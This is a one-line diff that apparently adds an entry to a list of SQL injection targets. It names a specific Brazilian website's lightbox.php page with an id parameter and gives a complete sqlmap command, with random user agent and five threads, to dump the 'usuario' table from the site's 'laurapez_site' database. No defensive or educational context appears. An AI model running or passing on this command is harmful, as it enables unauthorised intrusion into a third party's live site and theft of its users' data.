@@ -1,0 +1,1 @@
+https://www.laurapezolato.com.br/lightbox.php?id=76 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.laurapezolato.com.br/lightbox.php?id=76 -D laurapez_site -T usuario --dump
